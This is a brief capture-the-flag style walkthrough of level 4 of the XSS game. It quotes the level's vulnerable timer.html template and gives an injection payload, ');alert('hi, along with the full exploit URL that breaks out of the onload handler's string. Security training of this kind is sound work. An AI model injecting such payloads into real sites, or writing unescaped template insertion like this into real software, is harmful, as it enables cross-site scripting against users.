# [Level 4: Context matters](https://xss-game.appspot.com/level4)

Again we will notice we can work with url and this almost same as previous level just we have to write accurately to make it work.
There are 2 source code of which timer.html is displayed on we start the timer.

**timer.html**
```
<!doctype html>
<html>
  <head>
    <!-- Internal game scripts/styles, mostly boring stuff -->
    <script src="/static/game-frame.js"></script>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />
 
    <script>
      function startTimer(seconds) {
        seconds = parseInt(seconds) || 3;
        setTimeout(function() { 
          window.confirm("Time is up!");
          window.history.back();
        }, seconds * 1000);
      }
    </script>
  </head>
  <body id="level4">
    <img src="/static/logos/level4.png" />
    <br>
    <img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />
    <br>
    <div id="message">Your timer will execute in {{ timer }} seconds.</div>
  </body>
</html>
```

If we give a input for ```timer``` such that the onload will run alert() along with startTimer() then our work is done.
So the input will be ```');alert('hi```

The whole url will be ```https://xss-game.appspot.com/level4/frame?timer=');alert('hi```
